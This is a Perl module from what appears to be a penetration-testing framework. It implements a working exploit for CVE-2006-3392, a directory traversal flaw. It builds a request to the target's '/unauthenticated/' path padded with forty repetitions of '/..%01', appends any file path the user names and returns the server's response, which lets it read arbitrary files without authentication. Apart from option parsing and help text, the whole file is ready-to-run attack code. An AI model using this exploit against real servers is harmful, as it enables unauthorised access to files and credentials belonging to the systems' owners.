package Spellbook::Advisory::CVE_2006_3392 {
    use strict;
    use warnings;
    use Spellbook::Core::UserAgent;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $file);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"     => \$help,
            "t|target=s" => \$target,
            "f|file=s"   => \$file
        );

        if ($target) {
            if ($target !~ /^http(?:s)?:\/\//x) {
                $target = "https://$target";
            }

            my $userAgent = Spellbook::Core::UserAgent -> new();
            my $temp      = "/..%01" x 40;
            my $request   = $userAgent -> get($target . "/unauthenticated/" . $temp . $file);

            return $request -> content();
        }

        if ($help) {
            return <<"EOT";

Exploit::CVE_2006_3392
=======================
-h, --help     See this menu
-t, --target   Define a target
-f, --file     Define a file to read

EOT
        }

        return 0;
    }
}

1;